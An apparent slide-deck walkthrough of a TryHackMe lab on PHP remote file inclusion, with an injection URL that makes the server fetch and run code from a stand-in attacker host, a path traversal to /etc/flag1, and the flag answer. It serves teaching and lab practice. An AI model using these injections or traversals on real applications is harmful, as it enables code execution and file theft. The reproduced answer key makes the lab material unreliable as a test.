# File Inclusion - RFI (Lab)

_Category: Common Web Attacks / File Inclusion Lab — Source: https://www.canva.com/design/DAGm88OiVlw/Q-MGeVZIml87MSHOm8HdJg/edit_

---

## Slide 1

FILE INCLUSION - RFI

LAB

File Inclusion - RFI

lab

## Slide 2

REMOTE FILE INCLUSION (RFI)

LAB WALKTHROUGH

This walkthrough is part of TryHackMe focusing on
exploiting vulnerabilities on realistic targets. 

Room Link

https://tryhackme.com/room/fileinc

Lab Walkthrough

Remote File Inclusion (RFI)

This walkthrough is part of TryHackMe focusing on exploiting vulnerabilities on realistic targets.

Room Link

https://tryhackme.com/room/fileinc

## Slide 3

IN THIS LAB, YOU WILL:

Identify and exploit a Remote File Inclusion (LFI) vulnerability
in a PHP-based web application.

Use path traversal techniques to read sensitive files

If the server fetches and executes the remote file, it
confirms that it is vulnerable to RFI.

One requirement for RFI is that the allow_url_fopen option
needs to be on.

This task contains a Remote File Inclusion (RFI) vulnerability in
a PHP application that dynamically loads pages using a page
parameter in the URL.

To solve this task, host a malicious PHP file on your own
server and supply its URL to the vulnerable application.

In this lab, you will:

Identify and exploit a Remote File Inclusion (LFI) vulnerability in a PHP-based web application.

Use path traversal techniques to read sensitive files

This task contains a Remote File Inclusion (RFI) vulnerability in a PHP application that dynamically loads pages using a page parameter in the URL.

To solve this task, host a malicious PHP file on your own server and supply its URL to the vulnerable application.

If the server fetches and executes the remote file, it confirms that it is vulnerable to RFI.

One requirement for RFI is that the allow_url_fopen option needs to be on.

## Slide 4

CHALLENGE 1

In this section, we will walk you through various RFI scenarios and how to exploit them.﻿

The following figure is an example of steps for a successful RFI attack! Let's say that
the attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt 

where cmd.txt contains a printing message Hello THM.

<?PHP echo "Hello THM"; ?>

 Hello THM

Challenge 1

In this section, we will walk you through various RFI scenarios and how to exploit them.﻿

The following figure is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt

where cmd.txt contains a printing message Hello THM.

<?PHP echo "Hello THM"; ?>

Hello THM

## Slide 5

http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt

First, the attacker injects the malicious URL, which points to the
attacker's server, such as

Server fetches file from attacker site

If there is no input validation, then the malicious URL passes into the
include function. Next, the web app server will send a GET request to the
malicious server to fetch the file.

First, the attacker injects the malicious URL, which points to the attacker's server, such as

http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt

Server fetches file from attacker site

If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file.

## Slide 6

As a result, the web app includes the remote file into include function
to execute the PHP file within the page and send the execution
content to the attacker.

In our case, the current page somewhere has to show the
Hello THM message.

Visit the following lab URL:
http://ip/playground.php 

to try out an RFI attack

Hello THM

As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker.

In our case, the current page somewhere has to show the Hello THM message.

Hello THM

Visit the following lab URL: http://ip/playground.php

to try out an RFI attack

## Slide 7

Capture Flag1 at /etc/flag1

So we need to get this executed : ../../../../etc/flag1 but they want us to use
POST instead of GET. GET is normally used to retrieve files from server.

QUESTION

POST

GET

Question

Capture Flag1 at /etc/flag1

So we need to get this executed : ../../../../etc/flag1 but they want us to use POST instead of GET. GET is normally used to retrieve files from server.

POST

get

## Slide 8

Launch the Machine from
the TryHackMe interface.

Wait until the machine is
fully booted and note the
IP address

In your browser, go to
the IP, and you’ll see a
standard webpage
being loaded.

STEPS TO SOLVE

IP

Steps to Solve

Launch the Machine from the TryHackMe interface.

Wait until the machine is fully booted and note the IP address

ip

In your browser, go to the IP, and you’ll see a standard webpage being loaded.

## Slide 9

Open Burp Suite and open
the challenge #1.

Activate the Proxy, put
the path to the file in the
include form

Go to Burp and make
sure that Intercept is
activated, put the file
path in the include form,
and click on Include

STEPS TO SOLVE

Steps to Solve

Open Burp Suite and open the challenge #1.

Activate the Proxy, put the path to the file in the include form

Go to Burp and make sure that Intercept is activated, put the file path in the include form, and click on Include

## Slide 10

Change Request Method from GET to POST. Once this is
done, click on Forward, and you will receive the flag1 file

STEPS TO SOLVE

POST

GET

flag1

Steps to Solve

get

POST

flag1

Change Request Method from GET to POST. Once this is done, click on Forward, and you will receive the flag1 file

## Slide 11

The answer is F1x3d-iNpu7-f0rrn

ANSWER

Answer

The answer is F1x3d-iNpu7-f0rrn
